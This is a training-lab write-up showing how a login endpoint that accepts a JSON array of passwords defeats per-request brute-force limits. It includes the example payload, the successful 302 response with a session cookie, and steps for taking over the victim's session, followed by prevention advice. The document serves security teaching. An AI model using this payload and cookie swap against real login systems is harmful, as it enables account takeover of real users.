# Lab: Broken Brute-Force Protection, Multiple Credentials per Request

## Objective

Exploit a logic flaw in the login mechanism to bypass brute-force protection and recover Carlos's password.

---

## Vulnerability

The application implements brute-force protection based on the **number of HTTP requests**, not the number of credentials processed.

The login endpoint accepts a JSON array for the `password` parameter and attempts each password within a single request.

As a result, multiple passwords can be tested while consuming only one brute-force attempt.

---

## Phase 1 - Capture Login Request

Capture the login request:

```http
POST /login
```

Example:

```json
{
    "username":"carlos",
    "password":"123"
}
```

Notice:

```
Content-Type: application/json
```

---

## Phase 2 - Discover the Logic Flaw

Replace the password with an array of candidate passwords.

Example:

```json
{
    "username":"carlos",
    "password":[
        "123456",
        "password",
        "12345678",
        ...
        "moscow",
        "random"
    ]
}
```

The server accepts the JSON request successfully.

---

## Phase 3 - Send the Request

Send the modified request.

One of the supplied passwords is valid.

Instead of returning an authentication error, the server responds with:

```http
HTTP/2 302 Found

Location: /my-account?id=carlos

Set-Cookie:
session=EUU6eSfbhuNfVUxH0EbynbYpcY58dsoA
```

This indicates successful authentication.

---

## Phase 4 - Hijack the Session

Copy the new session cookie:

```
session=EUU6eSfbhuNfVUxH0EbynbYpcY58dsoA
```

Open Developer Tools (Inspect).

Replace your current session cookie with the new one.

Refresh the page.

You are now logged in as Carlos.

Lab Solved ✅

---

## Why does this vulnerability exist?

The application applies brute-force protection per HTTP request.

However, the backend processes every value contained in the JSON password array as an individual login attempt.

This allows attackers to test an entire password wordlist using only one request.

---

## Prevention

- Validate JSON input types.
- Reject arrays when a single password value is expected.
- Count authentication attempts per credential, not per request.
- Apply brute-force protection after parsing all supplied credentials.
- Enforce strict JSON schema validation.

---

## Tools Used

- Burp Suite
    - Proxy
    - Repeater
- Browser Developer Tools

---

## Skills Learned

- Business Logic Flaw
- JSON Parser Abuse
- Brute-Force Protection Bypass
- Session Hijacking
- Authentication Logic Analysis

---

## Real World Scenario

APIs that accept JSON payloads sometimes fail to validate data types properly.

If an endpoint expects a single password but accepts arrays, attackers may test hundreds of passwords in one request while bypassing rate limits or account lockout mechanisms.

---

## Key Takeaway

**Brute-force protection must be based on the number of credentials processed, not simply the number of incoming HTTP requests. APIs should strictly validate input types and reject unexpected JSON structures.**
